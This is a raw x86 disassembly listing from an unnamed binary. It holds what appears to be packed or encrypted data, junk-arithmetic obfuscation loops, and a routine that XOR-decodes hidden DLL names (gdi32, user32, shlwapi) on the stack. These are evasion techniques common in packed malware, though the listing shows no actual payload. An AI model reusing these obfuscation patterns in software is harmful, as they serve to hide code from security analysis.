  41c804:	jmp    0x41c7c8
  41c806:	jmp    0xc4c67289
  41c80b:	std    
  41c80c:	jl     0x41c7d0
  41c80e:	les    eax,FWORD PTR [ebp+0x2c]
  41c811:	dec    ebp
  41c812:	mov    dl,0xde
  41c814:	shr    eax,0x72
  41c817:	mov    ds:0x644b6b6,al
  41c81c:	je     0x41c88f
  41c81e:	mov    dh,0xea
  41c820:	xor    dh,BYTE PTR [esi+0x73]
  41c823:	fild   DWORD PTR [eax-0x9f2847d]
  41c829:	call   0x7de9:0xcde118d4
  41c830:	xchg   DWORD PTR ds:0x32dbe1c5,eax
  41c836:	in     al,0x19
  41c838:	imul   ecx,edx,0xaa660c4
  41c83e:	xchg   ebx,eax
  41c83f:	push   0x46a33719
  41c844:	shr    DWORD PTR cs:[eax+ebx*4+0xb],cl
  41c849:	pop    esp
  41c84a:	ins    DWORD PTR es:[edi],dx
  41c84b:	or     DWORD PTR [ebx+0x6a],edi
  41c84e:	sbb    al,0xf7
  41c850:	cs xchg edx,eax
  41c852:	stos   BYTE PTR es:[edi],al
  41c853:	adc    al,0x70
  41c855:	sub    BYTE PTR gs:[esi-0x7c],ah
  41c859:	call   0x33559139
  41c85e:	jmp    0x7bca54ad
  41c863:	(bad)  
  41c864:	sar    BYTE PTR [ecx],1
  41c866:	pop    ebx
  41c867:	or     al,ah
  41c869:	fs sub eax,0x38f41aa
  41c86f:	xlat   BYTE PTR ds:[ebx]
  41c870:	popf   
  41c871:	int    0x84
  41c873:	inc    esp
  41c874:	test   BYTE PTR [edx],al
  41c876:	cmp    eax,0x20753264
  41c87b:	int    0xf3
  41c87d:	push   0xffffffe5
  41c87f:	dec    ecx
  41c880:	pop    ebx
  41c881:	push   esi
  41c882:	xchg   ecx,eax
  41c883:	out    dx,al
  41c884:	cmp    dl,BYTE PTR [ebx]
  41c886:	out    dx,eax
  41c887:	push   ebx
  41c888:	cli    
  41c889:	cmp    cl,BYTE PTR [ebx-0x40]
  41c88c:	lods   al,BYTE PTR ds:[esi]
  41c88d:	adc    al,0xe3
  41c88f:	push   ecx
  41c890:	cwde   
  41c891:	xor    ebx,DWORD PTR gs:[ecx]
  41c894:	outs   dx,DWORD PTR ds:[esi]
  41c895:	push   edi
  41c896:	lahf   
  41c897:	sub    edx,DWORD PTR [eax]
  41c899:	xor    al,0x34
  41c89b:	cmp    BYTE PTR [edi+edx*1+0x2a],ah
  41c89f:	shl    DWORD PTR [eax],cl
  41c8a1:	leave  
  41c8a2:	jno    0x41c8cd
  41c8a4:	retf   
  41c8a5:	and    eax,0x68460207
  41c8aa:	or     DWORD PTR [ebx-0x383585db],0xffffffd3
  41c8b1:	push   es
  41c8b2:	bound  eax,QWORD PTR [ebp+0x6e]
  41c8b5:	inc    edi
  41c8b6:	or     eax,0x7b418405
  41c8bb:	xor    BYTE PTR [edx-0x61f92dfb],cl
  41c8c1:	xchg   ecx,eax
  41c8c2:	dec    eax
  41c8c3:	add    dl,BYTE PTR [edx-0x4b]
  41c8c6:	cs stos BYTE PTR es:[edi],al
  41c8c8:	xchg   esi,eax
  41c8c9:	ins    DWORD PTR es:[edi],dx
  41c8ca:	ins    BYTE PTR es:[edi],dx
  41c8cb:	ret    0xb6ab
  41c8ce:	mov    ds:0xb87d7eb3,eax
  41c8d3:	adc    ch,BYTE PTR [edx+0x79]
  41c8d6:	outs   dx,BYTE PTR ds:[esi]
  41c8d7:	pushf  
  41c8d8:	add    al,0xee
  41c8da:	popf   
  41c8db:	scas   al,BYTE PTR es:[edi]
  41c8dc:	mov    bl,0x37
  41c8de:	mov    cl,0x8
  41c8e0:	sub    ch,bh
  41c8e2:	inc    ecx
  41c8e3:	je     0x41c8fd
  41c8e5:	les    edi,FWORD PTR [eax]
  41c8e7:	mov    edx,0x299b2140
  41c8ec:	sub    eax,0x27d6568e
  41c8f1:	call   0x6e421dc1
  41c8f6:	jmp    0x41c8f2
  41c8f8:	imul   edx,DWORD PTR [esi-0x21],0xffffffbb
  41c8fc:	rcr    DWORD PTR [ebp+0x667cb02f],0x21
  41c903:	aaa    
  41c904:	mov    ah,0xcf
  41c906:	inc    edi
  41c907:	das    
  41c908:	sub    ah,BYTE PTR [eax-0x41144560]
  41c90e:	stc    
  41c90f:	outs   dx,DWORD PTR ds:[esi]
  41c910:	cli    
  41c911:	jo     0x41c906
  41c913:	or     al,0xab
  41c915:	or     dh,BYTE PTR ds:0x458057c9
  41c91b:	into   
  41c91c:	jae    0x41c906
  41c91e:	shl    DWORD PTR [edx+0x56],0x37
  41c922:	pushf  
  41c923:	repz pop ecx
  41c925:	xchg   DWORD PTR [ecx-0x1fe8f38],ecx
  41c92b:	adc    al,BYTE PTR [ebp-0x11]
  41c92e:	xor    eax,0x470a4247
  41c933:	mov    eax,ds:0xaf0588cc
  41c938:	sti    
  41c939:	pop    ecx
  41c93a:	pop    ebx
  41c93b:	fs push ss
  41c93d:	add    BYTE PTR gs:[edx+0x52f47793],cl
  41c944:	(bad)  
  41c945:	or     ch,BYTE PTR [eax]
  41c947:	aaa    
  41c948:	(bad)  
  41c949:	or     ch,ch
  41c94b:	add    ebp,ebx
  41c94d:	sbb    eax,0xc8002010
  41c952:	jl     0x41c968
  41c954:	dec    ecx
  41c955:	jge    0x41c9a9
  41c957:	lods   eax,DWORD PTR ds:[esi]
  41c958:	sbb    DWORD PTR ds:[ebx+0x53454eeb],esp
  41c95f:	ret    0x107
  41c962:	leave  
  41c963:	xchg   DWORD PTR [ecx+0x74],edi
  41c966:	push   0xfffffffd
  41c968:	lds    edx,FWORD PTR [esi]
  41c96a:	xchg   ecx,eax
  41c96b:	dec    esp
  41c96c:	lods   al,BYTE PTR ds:[esi]
  41c96d:	cmc    
  41c96e:	pop    ecx
  41c96f:	cs pop ss
  41c971:	push   cs
  41c972:	xor    DWORD PTR ds:0x2ef95494,0x22
  41c979:	in     al,dx
  41c97a:	test   BYTE PTR [ebx],cl
  41c97c:	call   0x2dbc415a
  41c981:	adc    al,0xf4
  41c983:	jmp    FWORD PTR [ebp-0x77633ea0]
  41c989:	mov    ah,0xf
  41c98b:	jg     0x41c9f7
  41c98d:	mov    ebp,0x4151f82b
  41c992:	cld    
  41c993:	iret   
  41c994:	and    DWORD PTR [esi-0x5b],ebp
  41c997:	mov    ebp,DWORD PTR ds:0xe757f8a6
  41c99d:	ficomp DWORD PTR [edx]
  41c99f:	sub    BYTE PTR [ebx-0xd77641c],dl
  41c9a5:	aaa    
  41c9a6:	daa    
  41c9a7:	mov    al,BYTE PTR [edi]
  41c9a9:	xor    edx,DWORD PTR [esi+0x2b]
  41c9ac:	es sub al,0xa7
  41c9af:	sbb    bl,BYTE PTR ds:0x2785ca91
  41c9b5:	push   edx
  41c9b6:	mov    dh,0x23
  41c9b8:	adc    ebp,DWORD PTR [ecx]
  41c9ba:	aad    0x2f
  41c9bc:	lock pop edi
  41c9be:	imul   esp,ebp,0xc6eb1835
  41c9c4:	jo     0x41ca07
  41c9c6:	sbb    esp,esi
  41c9c8:	mov    bl,0xc9
  41c9ca:	addr16 mov ds:0x8d7b,eax
  41c9ce:	add    ah,bl
  41c9d0:	clc    
  41c9d1:	lahf   
  41c9d2:	dec    esi
  41c9d3:	xchg   esi,eax
  41c9d4:	scas   eax,DWORD PTR es:[edi]
  41c9d5:	aaa    
  41c9d6:	mov    cl,0x4c
  41c9d8:	xchg   edi,eax
  41c9d9:	ror    ah,1
  41c9db:	enter  0x4e91,0x34
  41c9df:	lds    edx,FWORD PTR [edi-0x2c1913d6]
  41c9e5:	in     eax,dx
  41c9e6:	jns    0x41c9b9
  41c9e8:	outs   dx,BYTE PTR ds:[esi]
  41c9e9:	xor    dl,BYTE PTR [esi+0x7a]
  41c9ec:	or     esp,ebx
  41c9ee:	cwde   
  41c9ef:	xor    edi,0xffffffed
  41c9f2:	call   0xf598:0x59f8dc49
  41c9f9:	pop    ebx
  41c9fa:	xchg   ebp,eax
  41c9fb:	add    dh,BYTE PTR ds:0xf5cbdc1b
  41ca01:	cmp    ebx,DWORD PTR ds:[ecx+0x42]
  41ca05:	inc    ebp
  41ca06:	push   edx
  41ca07:	push   ebx
  41ca08:	imul   edx,DWORD PTR [esi],0x6
  41ca0b:	mov    dh,0x35
  41ca0d:	cmp    eax,0x4b2e4acc
  41ca12:	pop    ebp
  41ca13:	and    DWORD PTR [eax+ecx*4],ebx
  41ca16:	mov    al,ds:0x1af3e107
  41ca1b:	cmp    esi,esi
  41ca1d:	inc    edi
  41ca1e:	or     DWORD PTR [esi-0x1b378001],ecx
  41ca24:	and    eax,0x8536c03c
  41ca29:	sub    ah,BYTE PTR [ecx+ecx*4+0x73a5e39]
  41ca30:	aas    
  41ca31:	cwde   
  41ca32:	pop    ss
  41ca33:	dec    ebp
  41ca34:	or     DWORD PTR [ecx],edx
  41ca36:	lea    ecx,[edi]
  41ca38:	iret   
  41ca39:	scas   eax,DWORD PTR es:[edi]
  41ca3a:	loope  0x41ca76
  41ca3c:	xor    BYTE PTR [ebx+edx*4],0x1b
  41ca40:	mov    eax,0x1b11e758
  41ca45:	mov    esi,0xcc75bcc7
  41ca4a:	mov    bh,0x2e
  41ca4c:	push   esi
  41ca4d:	addr16 jo 0x41cabb
  41ca50:	pop    ebx
  41ca51:	push   0x28adf463
  41ca56:	retf   
  41ca57:	inc    eax
  41ca58:	xor    edi,DWORD PTR [esi-0x17a6a26e]
  41ca5e:	and    esp,DWORD PTR [ebp+0x5f90b94b]
  41ca64:	dec    eax
  41ca65:	xor    BYTE PTR [edi+eax*1+0x786b5710],bl
  41ca6c:	mov    ebx,0xa1281522
  41ca71:	xor    eax,edx
  41ca73:	or     eax,0xad13f864
  41ca78:	add    esi,eax
  41ca7a:	inc    esp
  41ca7b:	mov    WORD PTR [eax-0x4f6e3ea3],ss
  41ca81:	jge    0x41cacf
  41ca83:	xchg   esp,eax
  41ca84:	dec    ecx
  41ca85:	scas   al,BYTE PTR es:[edi]
  41ca86:	(bad)  
  41ca87:	fcom   DWORD PTR [edx-0x6b]
  41ca8a:	fmul   QWORD PTR [edx+0x27]
  41ca8d:	jecxz  0x41cae4
  41ca8f:	pop    ds
  41ca90:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ca91:	cld    
  41ca92:	jne    0x41ca33
  41ca94:	mov    eax,ds:0xce2972a2
  41ca99:	clc    
  41ca9a:	mov    ds:0x810b3520,eax
  41ca9f:	push   ecx
  41caa0:	and    eax,0xa278c014
  41caa5:	paddusw mm7,QWORD PTR [esi]
  41caa8:	icebp  
  41caa9:	push   esi
  41caaa:	inc    eax
  41caab:	jnp    0x41cadf
  41caad:	js     0x41ca72
  41caaf:	mov    dh,0xf7
  41cab1:	(bad)  
  41cab3:	lock popf 
  41cab5:	test   DWORD PTR [ebx+ebx*8],ebx
  41cab8:	mov    edi,0xd288e344
  41cabd:	repnz bound edi,QWORD PTR cs:[ebx-0x56171269]
  41cac5:	sahf   
  41cac6:	nop
  41cac7:	fcmovnu st,st(3)
  41cac9:	out    0x5e,eax
  41cacb:	mov    ebp,0xa230b857
  41cad0:	push   es
  41cad1:	out    0x40,al
  41cad3:	icebp  
  41cad4:	shr    DWORD PTR [ebx+0xf5b5a7f],0xed
  41cadb:	and    BYTE PTR [esi+0x31],cl
  41cade:	int3   
  41cadf:	aam    0xaa
  41cae1:	xor    eax,0xaecbf135
  41cae6:	leave  
  41cae7:	shl    BYTE PTR [esi+0x52],0xd0
  41caeb:	mov    ebx,0xb7bbec06
  41caf0:	mov    bl,0x7
  41caf2:	loop   0x41caf5
  41caf4:	add    BYTE PTR [edi+0x375d71e8],bh
  41cafa:	sbb    DWORD PTR [ecx+0x72],edx
  41cafd:	mov    edx,esi
  41caff:	loope  0x41caea
  41cb01:	test   eax,0x38398ab9
  41cb06:	jecxz  0x41cb60
  41cb08:	dec    eax
  41cb09:	xchg   BYTE PTR [ecx-0x1ec40ef3],bl
  41cb0f:	or     BYTE PTR [eax],dh
  41cb11:	jns    0x41cb4f
  41cb13:	and    eax,0x35ac0ef0
  41cb18:	mov    BYTE PTR [edx],0xd2
  41cb1b:	clc    
  41cb1c:	sub    DWORD PTR [ebx+0x8],ebp
  41cb1f:	jg     0x41cb55
  41cb21:	push   cs
  41cb22:	std    
  41cb23:	ds out dx,al
  41cb25:	jle    0x41caf3
  41cb27:	xor    BYTE PTR [esi-0x1efd0ae3],dl
  41cb2d:	and    esp,DWORD PTR [ebp+0x52d074f9]
  41cb33:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cb34:	loop   0x41cb35
  41cb36:	add    BYTE PTR [ebx+0x3b022a8f],cl
  41cb3c:	mov    ah,0x71
  41cb3e:	sub    BYTE PTR [esi],0x4a
  41cb41:	aas    
  41cb42:	push   edi
  41cb43:	jle    0x41cb6b
  41cb45:	xor    edi,ecx
  41cb47:	xchg   ebx,eax
  41cb48:	fist   WORD PTR ds:0x97e13375
  41cb4e:	mov    ecx,0xc45dfe0a
  41cb53:	(bad)  
  41cb54:	xor    al,0x7a
  41cb56:	xchg   esp,eax
  41cb57:	fwait
  41cb58:	imul   ebx,DWORD PTR [ecx+0x612ee2d6],0x6c
  41cb5f:	adc    eax,0xd3233acd
  41cb64:	mov    DWORD PTR [ebp-0x4c],edx
  41cb67:	mov    edx,DWORD PTR [ebp+0x8]
  41cb6a:	mov    ebx,DWORD PTR [ebp-0x48]
  41cb6d:	lea    edx,[ebx+edx*1+0x241fc1f]
  41cb74:	mov    DWORD PTR [ebp-0x48],edx
  41cb77:	mov    edx,DWORD PTR [ebp+0x8]
  41cb7a:	mov    ebx,0xfa5e15e2
  41cb7f:	sub    ebx,edx
  41cb81:	add    ebx,DWORD PTR [ebp-0x44]
  41cb84:	mov    DWORD PTR [ebp-0x44],ebx
  41cb87:	mov    edx,DWORD PTR [ebp+0x8]
  41cb8a:	xor    edx,eax
  41cb8c:	add    edx,esi
  41cb8e:	jne    0x41a7ce
  41cb94:	mov    edx,DWORD PTR [ebp-0x14]
  41cb97:	mov    DWORD PTR [ebp+0x8],edx
  41cb9a:	jmp    0x41cc0f
  41cb9f:	mov    edx,DWORD PTR [ebp+0x8]
  41cba2:	mov    ebx,DWORD PTR [ebp-0x8]
  41cba5:	xor    edx,eax
  41cba7:	xor    ebx,eax
  41cba9:	sub    edx,ebx
  41cbab:	sub    edx,esi
  41cbad:	xor    edx,eax
  41cbaf:	mov    DWORD PTR [ebp+0x8],edx
  41cbb2:	mov    edx,DWORD PTR [ebp+0x8]
  41cbb5:	mov    ebx,DWORD PTR [ebp-0x58]
  41cbb8:	add    edx,0x5708c4
  41cbbe:	imul   edx,ebx
  41cbc1:	mov    DWORD PTR [ebp-0x58],edx
  41cbc4:	mov    edx,DWORD PTR [ebp+0x8]
  41cbc7:	mov    ebx,DWORD PTR [ebp-0x54]
  41cbca:	add    edx,0x64f8da
  41cbd0:	or     edx,ebx
  41cbd2:	mov    DWORD PTR [ebp-0x54],edx
  41cbd5:	mov    edx,DWORD PTR [ebp+0x8]
  41cbd8:	mov    ebx,DWORD PTR [ebp-0x50]
  41cbdb:	add    edx,ecx
  41cbdd:	xor    edx,ebx
  41cbdf:	mov    DWORD PTR [ebp-0x50],edx
  41cbe2:	mov    edx,DWORD PTR [ebp+0x8]
  41cbe5:	mov    ebx,DWORD PTR [ebp-0x4c]
  41cbe8:	add    edx,edi
  41cbea:	and    edx,ebx
  41cbec:	mov    DWORD PTR [ebp-0x4c],edx
  41cbef:	mov    edx,DWORD PTR [ebp+0x8]
  41cbf2:	mov    ebx,DWORD PTR [ebp-0x48]
  41cbf5:	lea    edx,[ebx+edx*1+0x241fc1f]
  41cbfc:	mov    DWORD PTR [ebp-0x48],edx
  41cbff:	mov    edx,DWORD PTR [ebp+0x8]
  41cc02:	mov    ebx,0xfa5e15e2
  41cc07:	sub    ebx,edx
  41cc09:	add    ebx,DWORD PTR [ebp-0x44]
  41cc0c:	mov    DWORD PTR [ebp-0x44],ebx
  41cc0f:	mov    edx,DWORD PTR [ebp+0x8]
  41cc12:	xor    edx,eax
  41cc14:	add    edx,esi
  41cc16:	jne    0x41cb9f
  41cc1c:	mov    edx,DWORD PTR [ebp-0x8]
  41cc1f:	mov    ebx,DWORD PTR [ebp-0xc]
  41cc22:	xor    edx,eax
  41cc24:	lea    edx,[edx+ebx*1+0x3272e2]
  41cc2b:	mov    DWORD PTR [ebp-0xc],edx
  41cc2e:	mov    edx,DWORD PTR [ebp-0x10]
  41cc31:	xor    edx,eax
  41cc33:	add    edx,esi
  41cc35:	jne    0x413baf
  41cc3b:	jmp    0x41cd52
  41cc40:	mov    ecx,DWORD PTR [ebp-0x14]
  41cc43:	mov    DWORD PTR [ebp+0x8],ecx
  41cc46:	jmp    0x41ccbf
  41cc4b:	mov    ecx,DWORD PTR [ebp+0x8]
  41cc4e:	mov    edx,DWORD PTR [ebp-0x8]
  41cc51:	xor    ecx,eax
  41cc53:	xor    edx,eax
  41cc55:	sub    ecx,edx
  41cc57:	sub    ecx,esi
  41cc59:	xor    ecx,eax
  41cc5b:	mov    DWORD PTR [ebp+0x8],ecx
  41cc5e:	mov    ecx,DWORD PTR [ebp+0x8]
  41cc61:	mov    edx,DWORD PTR [ebp-0x58]
  41cc64:	add    ecx,0x5708c4
  41cc6a:	imul   ecx,edx
  41cc6d:	mov    DWORD PTR [ebp-0x58],ecx
  41cc70:	mov    ecx,DWORD PTR [ebp+0x8]
  41cc73:	mov    edx,DWORD PTR [ebp-0x54]
  41cc76:	add    ecx,0x64f8da
  41cc7c:	or     ecx,edx
  41cc7e:	mov    DWORD PTR [ebp-0x54],ecx
  41cc81:	mov    ecx,DWORD PTR [ebp+0x8]
  41cc84:	mov    edx,DWORD PTR [ebp-0x50]
  41cc87:	add    ecx,0x242ebe9
  41cc8d:	xor    ecx,edx
  41cc8f:	mov    DWORD PTR [ebp-0x50],ecx
  41cc92:	mov    ecx,DWORD PTR [ebp+0x8]
  41cc95:	mov    edx,DWORD PTR [ebp-0x4c]
  41cc98:	add    ecx,edi
  41cc9a:	and    ecx,edx
  41cc9c:	mov    DWORD PTR [ebp-0x4c],ecx
  41cc9f:	mov    ecx,DWORD PTR [ebp+0x8]
  41cca2:	mov    edx,DWORD PTR [ebp-0x48]
  41cca5:	lea    ecx,[edx+ecx*1+0x241fc1f]
  41ccac:	mov    DWORD PTR [ebp-0x48],ecx
  41ccaf:	mov    ecx,DWORD PTR [ebp+0x8]
  41ccb2:	mov    edx,0xfa5e15e2
  41ccb7:	sub    edx,ecx
  41ccb9:	add    edx,DWORD PTR [ebp-0x44]
  41ccbc:	mov    DWORD PTR [ebp-0x44],edx
  41ccbf:	mov    ecx,DWORD PTR [ebp+0x8]
  41ccc2:	xor    ecx,eax
  41ccc4:	add    ecx,esi
  41ccc6:	jne    0x41cc4b
  41cccc:	jmp    0x41cd5e
  41ccd1:	mov    ecx,DWORD PTR [ebp+0x8]
  41ccd4:	mov    edx,DWORD PTR [ebp-0x8]
  41ccd7:	xor    ecx,eax
  41ccd9:	xor    edx,eax
  41ccdb:	sub    ecx,edx
  41ccdd:	sub    ecx,esi
  41ccdf:	xor    ecx,eax
  41cce1:	mov    DWORD PTR [ebp+0x8],ecx
  41cce4:	mov    ecx,DWORD PTR [ebp+0x8]
  41cce7:	mov    edx,DWORD PTR [ebp-0x58]
  41ccea:	add    ecx,0x5708c4
  41ccf0:	imul   ecx,edx
  41ccf3:	mov    DWORD PTR [ebp-0x58],ecx
  41ccf6:	mov    ecx,DWORD PTR [ebp+0x8]
  41ccf9:	mov    edx,DWORD PTR [ebp-0x54]
  41ccfc:	add    ecx,0x64f8da
  41cd02:	or     ecx,edx
  41cd04:	mov    DWORD PTR [ebp-0x54],ecx
  41cd07:	mov    ecx,DWORD PTR [ebp+0x8]
  41cd0a:	mov    edx,DWORD PTR [ebp-0x50]
  41cd0d:	add    ecx,0x242ebe9
  41cd13:	xor    ecx,edx
  41cd15:	mov    DWORD PTR [ebp-0x50],ecx
  41cd18:	mov    ecx,DWORD PTR [ebp+0x8]
  41cd1b:	mov    edx,DWORD PTR [ebp-0x4c]
  41cd1e:	add    ecx,edi
  41cd20:	and    ecx,edx
  41cd22:	mov    DWORD PTR [ebp-0x4c],ecx
  41cd25:	mov    ecx,DWORD PTR [ebp+0x8]
  41cd28:	mov    edx,DWORD PTR [ebp-0x48]
  41cd2b:	lea    ecx,[edx+ecx*1+0x241fc1f]
  41cd32:	mov    DWORD PTR [ebp-0x48],ecx
  41cd35:	mov    ecx,DWORD PTR [ebp+0x8]
  41cd38:	mov    edx,0xfa5e15e2
  41cd3d:	sub    edx,ecx
  41cd3f:	add    edx,DWORD PTR [ebp-0x44]
  41cd42:	mov    DWORD PTR [ebp-0x44],edx
  41cd45:	mov    ecx,DWORD PTR [ebp+0x8]
  41cd48:	xor    ecx,eax
  41cd4a:	add    ecx,esi
  41cd4c:	jne    0x41ccd1
  41cd52:	mov    ecx,DWORD PTR [ebp-0x8]
  41cd55:	xor    ecx,eax
  41cd57:	mov    eax,DWORD PTR [ebp+0x10]
  41cd5a:	add    ecx,esi
  41cd5c:	mov    DWORD PTR [eax],ecx
  41cd5e:	pop    edi
  41cd5f:	pop    esi
  41cd60:	pop    ebx
  41cd61:	leave  
  41cd62:	ret    0xc
  41cd65:	add    BYTE PTR [eax-0x5ffbffbe],ah
  41cd6b:	inc    edx
  41cd6c:	add    BYTE PTR [eax],cl
  41cd6e:	mov    al,ds:0xa00c0042
  41cd73:	inc    edx
  41cd74:	add    BYTE PTR [eax],dl
  41cd76:	mov    al,ds:0xa0140042
  41cd7b:	inc    edx
  41cd7c:	add    BYTE PTR [eax],bl
  41cd7e:	mov    al,ds:0xa01c0042
  41cd83:	inc    edx
  41cd84:	add    BYTE PTR [eax],al
  41cd86:	rol    BYTE PTR [edx+0x0],1
  41cd89:	add    al,0xd0
  41cd8b:	inc    edx
  41cd8c:	add    BYTE PTR [eax],cl
  41cd8e:	rol    BYTE PTR [edx+0x0],1
  41cd91:	or     al,0xd0
  41cd93:	inc    edx
  41cd94:	add    BYTE PTR [eax],dl
  41cd96:	rol    BYTE PTR [edx+0x0],1
  41cd99:	adc    al,0xd0
  41cd9b:	inc    edx
  41cd9c:	add    BYTE PTR [eax],bl
  41cd9e:	rol    BYTE PTR [edx+0x0],1
  41cda1:	sbb    al,0xd0
  41cda3:	inc    edx
	...
  41cdb4:	rcr    esp,1
  41cdb6:	xor    BYTE PTR [ebp+0x0],cl
  41cdb9:	add    BYTE PTR [eax],al
  41cdbb:	add    BYTE PTR [edx],al
  41cdbd:	add    BYTE PTR [eax],al
  41cdbf:	add    BYTE PTR ds:0x40000000,bh
  41cdc5:	into   
  41cdc6:	add    DWORD PTR [eax],eax
  41cdc8:	inc    eax
  41cdc9:	ret    0x1
  41cdcc:	add    BYTE PTR [eax-0x6ffbffbe],dl
  41cdd2:	inc    edx
  41cdd3:	add    BYTE PTR [eax],cl
  41cdd5:	nop
  41cdd6:	inc    edx
  41cdd7:	add    BYTE PTR [eax+edx*4],cl
  41cdda:	inc    edx
  41cddb:	add    BYTE PTR [eax],dl
  41cddd:	nop
  41cdde:	inc    edx
  41cddf:	add    BYTE PTR [eax+edx*4],dl
  41cde2:	inc    edx
  41cde3:	add    BYTE PTR [eax],bl
  41cde5:	nop
  41cde6:	inc    edx
  41cde7:	add    BYTE PTR [eax+edx*4],bl
  41cdea:	inc    edx
  41cdeb:	add    BYTE PTR [eax],ah
  41cded:	nop
  41cdee:	inc    edx
  41cdef:	add    BYTE PTR [eax+edx*4],ah
  41cdf2:	inc    edx
  41cdf3:	add    BYTE PTR [eax],ch
  41cdf5:	nop
  41cdf6:	inc    edx
  41cdf7:	add    BYTE PTR [eax],al
  41cdf9:	mov    al,0x42
  41cdfb:	add    BYTE PTR [eax+esi*4],al
  41cdfe:	inc    edx
  41cdff:	add    BYTE PTR [eax],cl
  41ce01:	mov    al,0x42
  41ce03:	add    BYTE PTR [eax+esi*4],cl
  41ce06:	inc    edx
  41ce07:	add    BYTE PTR [eax],dl
  41ce09:	mov    al,0x42
  41ce0b:	add    BYTE PTR [eax+esi*4],dl
  41ce0e:	inc    edx
  41ce0f:	add    BYTE PTR [eax],bl
  41ce11:	mov    al,0x42
  41ce13:	add    BYTE PTR [eax+esi*4],bl
  41ce16:	inc    edx
  41ce17:	add    BYTE PTR [eax],al
  41ce19:	rol    BYTE PTR [edx+0x0],0x4
  41ce1d:	rol    BYTE PTR [edx+0x0],0x8
  41ce21:	rol    BYTE PTR [edx+0x0],0xc
  41ce25:	rol    BYTE PTR [edx+0x0],0x10
  41ce29:	rol    BYTE PTR [edx+0x0],0x14
  41ce2d:	rol    BYTE PTR [edx+0x0],0x18
  41ce31:	rol    BYTE PTR [edx+0x0],0x1c
  41ce35:	rol    BYTE PTR [edx+0x0],0x0
  41ce39:	add    BYTE PTR [eax],al
  41ce3b:	add    BYTE PTR [eax],al
  41ce3d:	add    BYTE PTR [eax],al
  41ce3f:	add    BYTE PTR [edx+0x53],dl
  41ce42:	inc    esp
  41ce43:	push   ebx
  41ce44:	loop   0x41ceaf
  41ce46:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ce47:	mov    bl,0x42
  41ce49:	dec    edi
  41ce4a:	es dec edx
  41ce4c:	lods   al,BYTE PTR ds:[esi]
  41ce4d:	dec    edi
  41ce4e:	mov    ebx,0xf147511
  41ce53:	adc    eax,DWORD PTR [ecx]
  41ce55:	add    BYTE PTR [eax],al
  41ce57:	add    BYTE PTR [ebx+0x3a],al
  41ce5a:	pop    esp
  41ce5b:	inc    ebx
  41ce5c:	jne    0x41ced0
  41ce5e:	jb     0x41cec5
  41ce60:	outs   dx,BYTE PTR ds:[esi]
  41ce61:	je     0x41cea7
  41ce63:	popa   
  41ce64:	je     0x41cec7
  41ce66:	pop    esp
  41ce67:	dec    ebp
  41ce68:	outs   dx,DWORD PTR ds:[esi]
  41ce69:	imul   esp,DWORD PTR fs:[esi+0x79],0x7070415c
  41ce71:	ins    BYTE PTR es:[edi],dx
  41ce72:	imul   esp,DWORD PTR [ebx+0x61],0x6e6f6974
  41ce79:	dec    esi
  41ce7a:	gs ja  0x41ce7d
  41ce7d:	mov    edx,DWORD PTR [ebp-0x14]
  41ce80:	sub    esp,0xe4
  41ce86:	push   ebx
  41ce87:	push   edi
  41ce88:	mov    eax,ebx
  41ce8a:	xchg   ecx,eax
  41ce8b:	mov    eax,DWORD PTR [ebp+0x8]
  41ce8e:	mov    edi,0xf89c8585
  41ce93:	cmp    eax,edi
  41ce95:	jne    0x41d21d
  41ce9b:	mov    eax,DWORD PTR [ebp+0xc]
  41ce9e:	cmp    eax,0xf89c8584
  41cea3:	jne    0x41d21d
  41cea9:	mov    eax,DWORD PTR [ebp+0x24]
  41ceac:	mov    DWORD PTR [ebp-0x4],eax
  41ceaf:	mov    BYTE PTR [ebp-0x18],0x1b
  41ceb3:	mov    BYTE PTR [ebp-0x17],0x18
  41ceb7:	mov    BYTE PTR [ebp-0x16],0x5
  41cebb:	mov    BYTE PTR [ebp-0x15],0x4f
  41cebf:	mov    BYTE PTR [ebp-0x14],0x4e
  41cec3:	mov    BYTE PTR [ebp-0x13],0x7c
  41cec7:	mov    BYTE PTR [ebp-0x20],0x9
  41cecb:	mov    BYTE PTR [ebp-0x1f],0xf
  41cecf:	mov    BYTE PTR [ebp-0x1e],0x19
  41ced3:	mov    BYTE PTR [ebp-0x1d],0xe
  41ced7:	mov    BYTE PTR [ebp-0x1c],0x4f
  41cedb:	mov    BYTE PTR [ebp-0x1b],0x4e
  41cedf:	mov    BYTE PTR [ebp-0x1a],0x7c
  41cee3:	mov    BYTE PTR [ebp-0x28],0xf
  41cee7:	mov    BYTE PTR [ebp-0x27],0x4
  41ceeb:	mov    BYTE PTR [ebp-0x26],0x0
  41ceef:	mov    BYTE PTR [ebp-0x25],0xb
  41cef3:	push   esi
  41cef4:	mov    BYTE PTR [ebp-0x24],0x1d
  41cef8:	mov    BYTE PTR [ebp-0x23],0xc
  41cefc:	push   0x74
  41cefe:	mov    BYTE PTR [ebp-0x22],0x5
  41cf02:	mov    BYTE PTR [ebp-0x21],0x7c
  41cf06:	xor    esi,esi
  41cf08:	pop    edx
  41cf09:	mov    eax,0xf8
  41cf0e:	lea    ecx,[ebp+esi*1-0x18]
  41cf12:	movzx  ebx,BYTE PTR [ecx]
  41cf15:	xor    ebx,edx
  41cf17:	add    ebx,eax
  41cf19:	inc    esi
  41cf1a:	mov    BYTE PTR [ecx],bl
  41cf1c:	cmp    esi,0x6
  41cf1f:	jb     0x41cf0e
  41cf21:	xor    esi,esi
  41cf23:	lea    ecx,[ebp+esi*1-0x20]
  41cf27:	movzx  ebx,BYTE PTR [ecx]
  41cf2a:	xor    ebx,edx
  41cf2c:	add    ebx,eax
  41cf2e:	inc    esi
  41cf2f:	mov    BYTE PTR [ecx],bl
  41cf31:	cmp    esi,0x7
  41cf34:	jb     0x41cf23
  41cf36:	xor    esi,esi
  41cf38:	lea    ecx,[ebp+esi*1-0x28]
  41cf3c:	movzx  ebx,BYTE PTR [ecx]
  41cf3f:	xor    ebx,edx
  41cf41:	add    ebx,eax
  41cf43:	inc    esi
  41cf44:	mov    BYTE PTR [ecx],bl
  41cf46:	cmp    esi,0x8
  41cf49:	jb     0x41cf38
  41cf4b:	lea    eax,[ebp-0x2c]
  41cf4e:	mov    DWORD PTR [ebp-0x8],eax
  41cf51:	mov    ecx,DWORD PTR [ebp-0x8]
  41cf54:	mov    eax,0x7113fcef
  41cf59:	mov    DWORD PTR [ecx],eax
  41cf5b:	mov    ecx,DWORD PTR [ebp-0x2c]
  41cf5e:	cmp    ecx,eax
